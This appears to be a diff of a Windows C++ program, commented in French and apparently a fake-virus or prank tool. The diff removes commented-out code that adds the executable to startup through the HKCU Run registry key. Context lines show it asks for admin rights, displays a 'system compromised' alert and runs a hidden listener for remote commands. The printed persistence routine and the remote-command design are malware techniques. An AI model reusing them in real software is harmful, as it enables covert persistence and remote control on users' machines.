@@ -41,27 +41,6 @@ void RequestAdminPrivileges() {
     }
 }
 
-// Ajoute le programme au démarrage en écrivant dans le registre.
-/*
-void AddToStartup() {
-    HKEY hKey;
-    // Ouvre la clé de registre Run de l'utilisateur courant.
-    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER,
-        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
-        0, KEY_WRITE, &hKey);
-    if (result == ERROR_SUCCESS) {
-        TCHAR szPath[MAX_PATH];
-        // Récupère le chemin complet du programme en cours d'exécution.
-        GetModuleFileName(NULL, szPath, MAX_PATH);
-        // Écrit une nouvelle entrée "FakeVirus" dans la clé de registre.
-        RegSetValueEx(hKey, TEXT("fi.sh_"), 0, REG_SZ,
-            reinterpret_cast<const BYTE*>(szPath),
-            (lstrlen(szPath) + 1) * sizeof(TCHAR));
-        RegCloseKey(hKey);
-    }
-}
-*/
-
 // Affiche une boîte de dialogue d'alerte.
 void ShowMessage() {
     MessageBox(NULL, TEXT("Votre système est compromis !"), TEXT("Alerte"), MB_OK);
@@ -105,10 +84,6 @@ void ListenForCommand() {
 
 // Point d'entrée de l'application Windows (aucune console ne sera affichée)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Ajoute l'exécutable au démarrage.
-    /*
-    AddToStartup();
-    */
 
     // Lance le thread qui écoute les commandes distantes.
     thread listener(ListenForCommand);
